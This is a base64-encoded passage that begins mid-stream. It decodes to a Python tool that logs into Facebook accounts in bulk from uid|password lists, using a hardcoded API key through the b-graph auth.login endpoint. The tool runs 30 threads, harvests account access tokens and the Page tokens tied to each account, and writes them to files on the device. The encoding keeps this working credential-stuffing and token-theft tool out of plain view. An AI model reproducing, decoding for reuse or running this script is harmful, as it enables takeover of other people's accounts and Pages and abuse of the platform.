mVkfUFDQ09VTlQgLS0+IHt3aGl0ZX17dWlkfSB7cmVkfWFscmVhZHkgZXhpc3RzLiIpCiAgICAgICAgICAgIHByaW50KCJcMDMzWzE7MzFt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgICAgIHJldHVybgoKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhPWRhdGEpLmpzb24oKQogICAgICAgIAogICAgICAgIHByaW50KHJlc3BvbnNlKQogICAgICAgIGlmICdhY2Nlc3NfdG9rZW4nIGluIHJlc3BvbnNlOgogICAgICAgICAgICB0b2tlbiA9IHJlc3BvbnNlWydhY2Nlc3NfdG9rZW4nXQoKICAgICAgICAgICAgd2l0aCBvcGVuKHBhdGhfZmlsZSwgJ2EnKSBhcyBmOgogICAgICAgICAgICAgICAgZi53cml0ZShmInt1aWR9fHt0b2tlbn1cbiIpCgogICAgICAgICAgICBwcmludCgiXDAzM1sxOzM3beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgICAgICBwcmludChmIiAgICAgXDAzM1szMm1bU1VDQ0VTU11cMDMzWzBtOiBFeHRyYWN0ZWQgQWNjb3VudCDilIDilIDilIDilIDilIA+IHt1aWR9LiIpCiAgICAgICAgICAgIHByaW50KCJcMDMzWzE7Mzdt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgICAgIHN1Y2Nlc3NfY291bnQuYXBwZW5kKHVpZCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludCgiXDAzM1sxOzM3beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgICAgICBwcmludChmIiAgICAgXDAzM1szMW1bRkFJTEVEXVwwMzNbMG06IFRPIEVYVFJBQ1QgQWNjb3VudCDilIDilIDilIDilIDilIA+IHt1aWR9LiIpCiAgICAgICAgICAgIHByaW50KCJcMDMzWzE7Mzdt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiICAgICBcMDMzWzE7MzFtW0VSUk9SXVwwMzNbMG0gRXJyb3IgZXh0cmFjdGluZyBhY2NvdW50OiB7dWlkfS4gUmVhc29uOiB7c3RyKGUpfVwwMzNbMG1cbiIpCgoKZGVmIHByb3ooYWNjb3VudHNfZmlsZSwgdG9rZW5fb3V0cHV0X3BhdGgsIGV4dHJhY3RfdHlwZSk6CiAgICAiIiJQcm9jZXNzIHRoZSBhY2NvdW50cyBhbmQgZXh0cmFjdCB0b2tlbnMgY29uY3VycmVudGx5LiIiIgogICAgc3VjY2Vzc19jb3VudCA9IFtdCgogICAgIyBMb2FkIGV4aXN0aW5nIHVpZHMgZnJvbSB0aGUgb3V0cHV0IGZpbGUgdG8gYXZvaWQgZHVwbGljYXRlcwogICAgZXhpc3RpbmdfdWlkcyA9IHNldCgpCiAgICBpZiBvcy5wYXRoLmV4aXN0cyh0b2tlbl9vdXRwdXRfcGF0aCk6CiAgICAgICAgd2l0aCBvcGVuKHRva2VuX291dHB1dF9wYXRoLCAncicpIGFzIGY6CiAgICAgICAgICAgIGV4aXN0aW5nX3VpZHMgPSB7bGluZS5zcGxpdCgnfCcpWzBdIGZvciBsaW5lIGluIGYucmVhZGxpbmVzKCl9CgogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihhY2NvdW50c19maWxlLCAncicpIGFzIGZpbGU6CiAgICAgICAgICAgIGFjY291bnRzID0gZmlsZS5yZWFkbGluZXMoKQoKICAgICAgICBhY2NvdW50cyA9IFtsaW5lLnN0cmlwKCkgZm9yIGxpbmUgaW4gYWNjb3VudHMgaWYgJ3wnIGluIGxpbmUuc3RyaXAoKV0KCiAgICAgICAgaWYgbm90IGFjY291bnRzOgogICAgICAgICAgICBwcmludChmIk5vIHZhbGlkIGFjY291bnRzIGZvdW5kIGluIHthY2NvdW50c19maWxlfS4iKQogICAgICAgICAgICByZXR1cm4KCiAgICAgICAgd2l0aCB0aHJlYWQuVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTMwKSBhcyBleGVjdXRvcjoKICAgICAgICAgICAgZnV0dXJlcyA9IFtleGVjdXRvci5zdWJtaXQoYmdyYXBoLCB1aWQsIHB3LCB0b2tlbl9vdXRwdXRfcGF0aCwgZXh0cmFjdF90eXBlLCBzdWNjZXNzX2NvdW50LCBleGlzdGluZ191aWRzKQogICAgICAgICAgICAgICAgICAgICAgIGZvciB1aWQsIHB3IGluIFthY2NvdW50LnNwbGl0KCd8JykgZm9yIGFjY291bnQgaW4gYWNjb3VudHNdXQoKICAgICAgICAgICAgZm9yIGZ1dHVyZSBpbiBmdXR1cmVzOgogICAgICAgICAgICAgICAgZnV0dXJlLnJlc3VsdCgpCgogICAgICAgIHByaW50KCJcMDMzWzE7Mzdt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgcHJpbnQoZiIgICAgIFwwMzNbMTszNG1bU1VDQ0VTU11cMDMzWzBtOiB7bGVuKHN1Y2Nlc3NfY291bnQpfSB7ZXh0cmFjdF90eXBlfShzKSBzdWNjZXNzZnVsbHkgZXh0cmFjdGVkLiIpCiAgICAgICAgcHJpbnQoIlwwMzNbMTszN23ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgcHJpbnQoZiJGaWxlIG5vdCBmb3VuZDoge2FjY291bnRzX2ZpbGV9IikKICAgICAgICByZXR1cm4KCgpkZWYgYXhsMSgpOgogICAgY2xlYXJfc2NyZWVuKCkKICAgIGpvdmFuKCkKICAgIGZvbGRlcl9wYXRoID0gIi9zZGNhcmQvYm9vc3RwaGVyZSIKICAgIHByaW50KGYiICAgIFwwMzNbMzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBwcmludChmIiAgICAgXDAzM1szMW1bMDFdIFwwMzNbMzJtRlJBIEVYVFJBQ1QgQUNDT1VOVCIpCiAgICBwcmludChmIiAgICAgXDAzM1szMW1bMDJdIFwwMzNbMzJtRlJBIEVYVFJBQ1QgUEFHRVMiKQogICAgcHJpbnQoZiIgICAgIFwwMzNbMzFtWzAzXSBcMDMzWzMybVJQVyBFWFRSQUNUIEFDQ09VTlQiKQogICAgcHJpbnQoZiIgICAgIFwwMzNbMzFtWzA0XSBcMDMzWzMybVJQVyBFWFRSQUNUIFBBR0VTIikKICAgIHByaW50KGYiICAgIFwwMzNbMzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBzYXZlX2Nob2ljZSA9IGlucHV0KGYiICAgICBcMDMzWzMybUNIT0lDRTogIikuc3RyaXAoKQoKICAgIGlmIHNhdmVfY2hvaWNlID09ICcxJzoKICAgICAgICBhY2NvdW50X2ZpbGUgPSBvcy5wYXRoLmpvaW4oZm9sZGVyX3BhdGgsICJGUkFBQ0NPVU5ULnR4dCIpCiAgICAgICAgZXh0cmFjdF90eXBlID0gJ2FjY291bnQnCiAgICBlbGlmIHNhdmVfY2hvaWNlID09ICcyJzoKICAgICAgICBhY2NvdW50X2ZpbGUgPSBvcy5wYXRoLmpvaW4oZm9sZGVyX3BhdGgsICJGUkFQQUdFUy50eHQiKQogICAgICAgIGV4dHJhY3RfdHlwZSA9ICdwYWdlJwogICAgZWxpZiBzYXZlX2Nob2ljZSA9PSAnMyc6CiAgICAgICAgYWNjb3VudF9maWxlID0gb3MucGF0aC5qb2luKGZvbGRlcl9wYXRoLCAiUlBXQUNDT1VOVC50eHQiKQogICAgICAgIGV4dHJhY3RfdHlwZSA9ICdhY2NvdW50JwogICAgZWxpZiBzYXZlX2Nob2ljZSA9PSAnNCc6CiAgICAgICAgYWNjb3VudF9maWxlID0gb3MucGF0aC5qb2luKGZvbGRlcl9wYXRoLCAiUlBXUEFHRVMudHh0IikKICAgICAgICBleHRyYWN0X3R5cGUgPSAncGFnZScKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoIkludmFsaWQgY2hvaWNlLiBFeGl0aW5nLiIpCiAgICAgICAgcmV0dXJuCgogICAgcHJpbnQoZiIgICAgXDAzM1szNG3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIHByaW50KGYiICAgICBcMDMzWzMzbVRIRSBGT1JNQVQgU0hPVUxEIEJFIFwwMzNbMzFtdWlkfHBhc3MiKQogICAgcHJpbnQoZiIgICAgXDAzM1szNG3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIGZpbGVfcGF0aCA9IGlucHV0KGYiICAgICBcMDMzWzMzbVBBVEg6ICIpLnN0cmlwKCkKCiAgICB0b2tlbl9vdXRwdXRfcGF0aCA9IGFjY291bnRfZmlsZQoKICAgIHByb3ooZmlsZV9wYXRoLCB0b2tlbl9vdXRwdXRfcGF0aCwgZXh0cmFjdF90eXBlKQoKCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgcmFuZG9tCmltcG9ydCBjb25jdXJyZW50LmZ1dHVyZXMgYXMgdGhyZWFkCmltcG9ydCBvcwppbXBvcnQgc3RyaW5nCgpmYmF2ID0gZicnJ3tyYW5kb20ucmFuZGludCgxMTEsIDk5OSl9LjAuMC57cmFuZG9tLnJhbmRpbnQoMTEsIDk5KX0ue3JhbmRvbS5yYW5kaW50KDExMSwgOTk5KX0nJycKZmJidiA9IHN0cihyYW5kb20ucmFuZGludCgxMTExMTExMTEsIDk5OTk5OTk5OSkpCmZicnYgPSAnMCcKcmFuZG9tX3NlZWQgPSByYW5kb20uUmFuZG9tKCkKYWRpZCA9ICcnLmpvaW4ocmFuZG9tX3NlZWQuY2hvaWNlcyhzdHJpbmcuaGV4ZGlnaXRzLCBrPTE2KSkKdWFfYmdyYXBoID0gJ1tGQkFOL0ZCNEE7RkJBVi8nICsgc3RyKHJhbmRvbS5yYW5kaW50KDQ5LCA2NikpICsgJy4wLjAuJyArIHN0cihyYW5kb20ucmFuZHJhbmdlKDIwLCA0OSkpICsgc3RyKHJhbmRvbS5yYW5kaW50KDExLCA5OSkpICsgJztGQkJWLycgKyBzdHIocmFuZG9tLnJhbmRpbnQoMTExMTExMTEsIDc3Nzc3Nzc3KSkgKyAnOycgKyAnW0ZCQU4vRkI0QTtGQkFWLycgKyBmYmF2ICsgJztGQkJWLycgKyBmYmJ2ICsgJztGQkRNL3tkZW5zaXR5PTMuMCx3aWR0aD0xMDgwLGhlaWdodD0yMTA3fTtGQkxDL2ZyX0ZSO0ZCUlYvJyArIGZicnYgKyAnO0ZCQ1IvT29yZWRvbyBUTjtGQk1GL0hVQVdFSTtGQkJEL0hVQVdFSTtGQlBOL2NvbS5mYWNlYm9vay5rYXRhbmE7RkJEVi9NQVItTFgxTTtGQlNWLzk7RkJPUC8xO0ZCQ0EvYXJtNjQtdjhhOl0nCgpkZWYgbG9hZF9leGlzdGluZ190b2tlbnMocGF0aF9maWxlKToKICAgICIiIkxvYWQgZXhpc3RpbmcgYWNjb3VudHMgb3IgcGFnZXMgZnJvbSB0aGUgb3V0cHV0IGZpbGUuIiIiCiAgICBpZiBvcy5wYXRoLmV4aXN0cyhwYXRoX2ZpbGUpOgogICAgICAgIHdpdGggb3BlbihwYXRoX2ZpbGUsICdyJykgYXMgZjoKICAgICAgICAgICAgcmV0dXJuIHtsaW5lLnNwbGl0KCd8JylbMF0gZm9yIGxpbmUgaW4gZi5yZWFkbGluZXMoKX0gICMgU2V0IG9mIGV4aXN0aW5nIHVpZHMgb3IgcGFnZSBpZHMKICAgIHJldHVybiBzZXQoKQoKZGVmIGJncmFwaF9wYWdlKHVpZCwgcHcsIHBhdGhfZmlsZSwgZXh0cmFjdF90eXBlLCBzdWNjZXNzX2NvdW50LCBleGlzdGluZ190b2tlbnMpOgogICAgYWNjZXNzVG9rZW4gPSAnMzUwNjg1NTMxNzI4fDYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJyAgIyBFeGFtcGxlIHRva2VuCiAgICAKICAgIGlmIHVpZCBpbiBleGlzdGluZ190b2tlbnM6CiAgICAgICAgcHJpbnQoIlwwMzNbMTszN23ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICBwcmludChmIiAgICAge3doaXRlfUFDQ09VTlQg4pSA4pSA4pSA4pSA4pSAPiB7cmVkfXt1aWR9IHtncmVlbn1BTFJFQURZIEVYSVNUUyIpCiAgICAgICAgcmV0dXJuCgogICAgZGF0YSA9IHsKICAgICAgICAnbWV0aG9kJzogJ2F1dGgubG9naW4nLAogICAgICAgICdmYl9hcGlfcmVxX2ZyaWVuZGx5X25hbWUnOiAnYXV0aGVudGljYXRlJywKICAgICAgICAnZmJfYXBpX2NhbGxlcl9jbGFzcyc6ICdjb20uZmFjZWJvb2suYWNjb3VudC5sb2dpbi5wcm90b2NvbC5GYjRhQXV0aEhhbmRsZXInLAogICAgICAgICdhcGlfa2V5JzogJzYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJywKICAgICAgICAnZW1haWwnOiB1aWQsCiAgICAgICAgJ3Bhc3N3b3JkJzogcHcsCiAgICAgICAgJ2FjY2Vzc190b2tlbic6IGFjY2Vzc1Rva2VuCiAgICB9CgogICAgdXJsID0gJ2h0dHBzOi8vYi1ncmFwaC5mYWNlYm9vay5jb20vYXV0aC9sb2dpbj9pbmNsdWRlX2hlYWRlcnM9ZmFsc2UmZGVjb2RlX2JvZHlfanNvbj1mYWxzZSZzdHJlYW1hYmxlX2pzb25fcmVzcG9uc2U9dHJ1ZScKCiAgICB0cnk6CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwgZGF0YT1kYXRhKS5qc29uKCkKICAgICAgICAKICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiByZXNwb25zZToKICAgICAgICAgICAgdG9rZW4gPSByZXNwb25zZVsnYWNjZXNzX3Rva2VuJ10KCiAgICAgICAgICAgICMgRXh0cmFjdCBGYWNlYm9vayBQYWdlcyBhc3NvY2lhdGVkIHdpdGggdGhlIGFjY291bnQgdG9rZW4KICAgICAgICAgICAgcGFnZXMgPSBleHRyYWN0X2ZiX3BhZ2VzKHRva2VuKQogICAgICAgICAgICBpZiBwYWdlczoKICAgICAgICAgICAgICAgIGZvciBwYWdlIGluIHBhZ2VzOgogICAgICAgICAgICAgICAgICAgIHBhZ2VfaWQgPSBwYWdlWydpZCddCiAgICAgICAgICAgICAgICAgICAgaWYgcGFnZV9pZCBub3QgaW4gZXhpc3RpbmdfdG9rZW5zOgogICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4ocGF0aF9maWxlLCAnYScpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKGYie3BhZ2VfaWR9fHtwYWdlWydhY2Nlc3NUb2tlbiddfVxuIikKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7d2hpdGV9e3VpZH0gIOKUgOKUgOKUgOKUgOKUgD4ge2dyZWVufVBhZ2UgSUQ6IHtyZWR9e3BhZ2VfaWR9IHt5ZWxsb3d9RVhUUkFDVEVEIFNVQ0NFU1NGVUxMWSIpCiAgICAgICAgICAgICAgICAgICAgICAgIGV4aXN0aW5nX3Rva2Vucy5hZGQocGFnZV9pZCkKICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmInt3aGl0ZX1JRDogIHtwYWdlX2lkfSDilIDilIDilIDilIDilIA+IHtncmVlbn1BTFJFQURZIEVYSVNUUyAhICIpCgogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7d2hpdGV9e3VpZH0g4pSA4pSA4pSA4pSA4pSAPiB7cmVkfURPRVNOJ1QgSEFWRSBQQUdFUyAhIikKICAgICAgICAgICAgCiAgICAgICAgICAgIHN1Y2Nlc3NfY291bnQuYXBwZW5kKHVpZCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludChmInt3aGl0ZX17dWlkfSAg4pSA4pSA4pSA4pSA4pSAPiB7cmVkfUZBSUxFRCBUTyBFWFRSQUNUICEgIikKCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJbRVJST1JdIEVycm9yIGV4dHJhY3RpbmcgYWNjb3VudDoge3VpZH0uIFJlYXNvbjoge3N0cihlKX0iKQoKZGVmIGV4dHJhY3RfZmJfcGFnZXModG9rZW4pOgogICAgdXJsID0gJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YxOC4wL21lL2FjY291bnRzJwogICAgaGVhZGVycyA9IHsKICAgICAgICAnQXV0aG9yaXphdGlvbic6IGYnQmVhcmVyIHt0b2tlbn0nCiAgICB9CiAgICAKICAgIHBhZ2VzX2RhdGEgPSBbXQogICAgCiAgICB3aGlsZSB1cmw6CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsLCBoZWFkZXJzPWhlYWRlcnMpCiAgICAgICAgCiAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgIT0gMjAwOgogICAgICAgICAgICBwcmludChmJ0Vycm9yOiB7cmVzcG9uc2UudGV4dH0nKQogICAgICAgICAgICByZXR1cm4gTm9uZQogICAgICAgIAogICAgICAgIGRhdGEgPSByZXNwb25zZS5qc29uKCkKICAgICAgICBmb3IgcGFnZSBpbiBkYXRhLmdldCgnZGF0YScsIFtdKToKICAgICAgICAgICAgcGFnZXNfZGF0YS5hcHBlbmQoewogICAgICAgICAgICAgICAgJ2lkJzogcGFnZS5nZXQoJ2lkJyksCiAgICAgICAgICAgICAgICAnYWNjZXNzVG9rZW4nOiBwYWdlLmdldCgnYWNjZXNzX3Rva2VuJykKICAgICAgICAgICAgfSkKICAgICAgICAKICAgICAgICB1cmwgPSBkYXRhLmdldCgncGFnaW5nJywge30pLmdldCgnbmV4dCcpICAjIFVwZGF0ZSB0aGUgVVJMIGZvciB0aGUgbmV4dCByZXF1ZXN0CgogICAgcmV0dXJuIHBhZ2VzX2RhdGEKCmRlZiBwcm96YyhhY2NvdW50c19maWxlLCB0b2tlbl9vdXRwdXRfcGF0aCwgZXh0cmFjdF90eXBlKToKICAgIHN1Y2Nlc3NfY291bnQgPSBbXQogICAgZXhpc3RpbmdfdG9rZW5zID0gbG9hZF9leGlzdGluZ190b2tlbnModG9rZW5fb3V0cHV0X3BhdGgpCgogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihhY2NvdW50c19maWxlLCAncicpIGFzIGZpbGU6CiAgICAgICAgICAgIGFjY291bnRzID0gZmlsZS5yZWFkbGluZXMoKQoKICAgICAgICBhY2NvdW50cyA9IFtsaW5lLnN0cmlwKCkgZm9yIGxpbmUgaW4gYWNjb3VudHMgaWYgJ3wnIGluIGxpbmUuc3RyaXAoKV0KCiAgICAgICAgaWYgbm90IGFjY291bnRzOgogICAgICAgICAgICBwcmludChmIk5vIHZhbGlkIGFjY291bnRzIGZvdW5kIGluIHthY2NvdW50c19maWxlfS4iKQogICAgICAgICAgICByZXR1cm4KCiAgICAgICAgd2l0aCB0aHJlYWQuVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTMwKSBhcyBleGVjdXRvcjoKICAgICAgICAgICAgZnV0dXJlcyA9IFtleGVjdXRvci5zdWJtaXQoYmdyYXBoX3BhZ2UsIHVpZCwgcHcsIHRva2VuX291dHB1dF9wYXRoLCBleHRyYWN0X3R5cGUsIHN1Y2Nlc3NfY291bnQsIGV4aXN0aW5nX3Rva2VucykKICAgICAgICAgICAgICAgICAgICAgICBmb3IgdWlkLCBwdyBpbiBbYWNjb3VudC5zcGxpdCgnfCcpIGZvciBhY2NvdW50IGluIGFjY291bnRzXV0KCiAgICAgICAgICAgIGZvciBmdXR1cmUgaW4gZnV0dXJlczoKICAgICAgICAgICAgICAgIGZ1dHVyZS5yZXN1bHQoKQoKICAgICAgICBwcmludCgiXDAzM1sxOzM3beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIHByaW50KGYiICAgICBcMDMzWzE7MzRtW1NVQ0NFU1NdXDAzM1swbToge2xlbihzdWNjZXNzX2NvdW50KX0ge2V4dHJhY3RfdHlwZX0ocykgc3VjY2Vzc2Z1bGx5IGV4dHJhY3RlZC4iKQogICAgICAgIHByaW50KCJcMDMzWzE7Mzdt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCgogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgIHByaW50KGYiRmlsZSBub3QgZm91bmQ6IHthY2NvdW50c19maWxlfSIpCgpkZWYgYXhsMigpOgogICAgY2xlYXJfc2NyZWVuKCkKICAgIGpvdmFuKCkKICAgIGZvbGRlcl9wYXRoID0gIi9zZGNhcmQvYm9vc3RwaGVyZSIgIAogICAgcHJpbnQoZiIgICAgXDAzM1szNG3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIHByaW50KGYiICAgICBcMDMzWzMxbVswMV0gXDAzM1szMm1GUkEgRVhUUkFDVCBBQ0NPVU5UIikKICAgIHByaW50KGYiICAgICBcMDMzWzMxbVswMl0gXDAzM1szMm1GUkEgRVhUUkFDVCBQQUdFUyIpCiAgICBwcmludChmIiAgICAgXDAzM1szMW1bMDNdIFwwMzNbMzJtUlBXIEVYVFJBQ1QgQUNDT1VOVCIpCiAgICBwcmludChmIiAgICAgXDAzM1szMW1bMDRdIFwwMzNbMzJtUlBXIEVYVFJBQ1QgUEFHRVMiKQogICAgcHJpbnQoZiIgICAgXDAzM1szNG3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIHNhdmVfY2hvaWNlID0gaW5wdXQoZiIgICAgIFwwMzNbMzJtQ0hPSUNFOiAiKS5zdHJpcCgpCgogICAgaWYgc2F2ZV9jaG9pY2UgPT0gJzEnOgogICAgICAgIGFjY291bnRfZmlsZSA9IG9zLnBhdGguam9pbihmb2xkZXJfcGF0aCwgIkZSQUFDQ09VTlQudHh0IikKICAgICAgICBleHRyYWN0X3R5cGUgPSAnYWNjb3VudCcKICAgIGVsaWYgc2F2ZV9jaG9pY2UgPT0gJzInOgogICAgICAgIGFjY291bnRfZmlsZSA9IG9zLnBhdGguam9pbihmb2xkZXJfcGF0aCwgIkZSQVBBR0VTLnR4dCIpCiAgICAgICAgZXh0cmFjdF90eXBlID0gJ3BhZ2UnCiAgICBlbGlmIHNhdmVfY2hvaWNlID09ICczJzoKICAgICAgICBhY2NvdW50X2ZpbGUgPSBvcy5wYXRoLmpvaW4oZm9sZGVyX3BhdGgsICJSUFdBQ0NPVU5ULnR4dCIpCiAgICAgICAgZXh0cmFjdF90eXBlID0gJ2FjY291bnQnCiAgICBlbGlmIHNhdmVfY2hvaWNlID09ICc0JzoKICAgICAgICBhY2NvdW50X2ZpbGUgPSBvcy5wYXRoLmpvaW4oZm9sZGVyX3BhdGgsICJSUFdQQUdFUy50eHQiKQo